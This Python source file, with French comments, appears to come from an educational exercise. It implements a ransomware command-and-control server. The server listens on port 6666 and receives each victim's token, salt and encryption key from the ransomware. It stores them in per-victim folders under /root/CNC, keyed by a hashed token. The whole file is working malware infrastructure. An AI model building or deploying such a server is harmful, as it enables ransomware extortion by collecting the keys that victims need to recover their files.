import base64
import hashlib
import os
from http.server import HTTPServer
from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_DIR = "/root/CNC"

    def save_base64(self, token, data, filename):
        """
        Cette fonction décode les données en base64 et les enregistre sous forme de fichier.
        """
        data_bin = base64.b64decode(data)  # Décodage du base64 en binaire
        path_fichier = os.path.join(self.ROOT_DIR, token, filename)  # Création du chemin
        with open(path_fichier, "wb") as fichier:
            fichier.write(data_bin)  # Écriture des données binaires

    def post_new(self, path, params, body):
        """
        Cette fonction reçoit les infos envoyées par le ransomware et les enregistre.
        """
        try:
            token = body["token"]  # Récupération du token
            salt = body["salt"]  # Récupération du sel
            key = body["key"]  # Récupération de la clé

            self._log.info(f"Token reçu: {token}")  # Affichage du token dans les logs

            # On hache le token pour avoir un identifiant unique de victime
            token_hache = hashlib.sha256(base64.b64decode(token)).hexdigest()
            dossier_victime = os.path.join(self.ROOT_DIR, token_hache)  # Chemin de la victime
            os.makedirs(dossier_victime, exist_ok=True)  # Création du dossier si pas encore fait

            # Enregistrement du sel et de la clé
            self._ecrire_fichier(dossier_victime, "salt", salt)
            self._ecrire_fichier(dossier_victime, "key", key)

            # Vérifie si le dossier a bien été créé et retourne le statut
            if os.path.isdir(dossier_victime):
                return {"status": "Success"}
            else:
                return {"status": "Error"}
        
        except KeyError as e:
            self._log.error(f"Erreur : il manque une donnée -> {e}")
            return {"status": "Error", "message": f"Donnée manquante : {str(e)}"}

    def _ecrire_fichier(self, dossier, nom_fichier, contenu):
        """
        Fonction qui écrit des données dans un fichier.
        """
        chemin_fichier = os.path.join(dossier, nom_fichier)
        with open(chemin_fichier, "w") as fichier:
            fichier.write(contenu)

# Lancement du serveur
serveur = HTTPServer(('0.0.0.0', 6666), CNC)
serveur.serve_forever()

